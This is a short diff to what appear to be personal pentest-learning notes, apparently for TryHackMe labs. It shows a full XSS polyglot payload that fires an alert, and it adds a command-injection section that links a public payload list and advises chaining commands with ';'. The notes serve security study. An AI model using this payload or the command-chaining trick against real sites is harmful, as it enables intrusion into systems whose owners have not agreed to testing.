@@ -98,3 +98,9 @@ Some payloads :
 Polyglot (c'est OP)
 
     jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/-       -!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
+## Command Injection 
+https://github.com/payloadbox/command-injection-payload-list
+
+Use ";" to chain syscall.
+
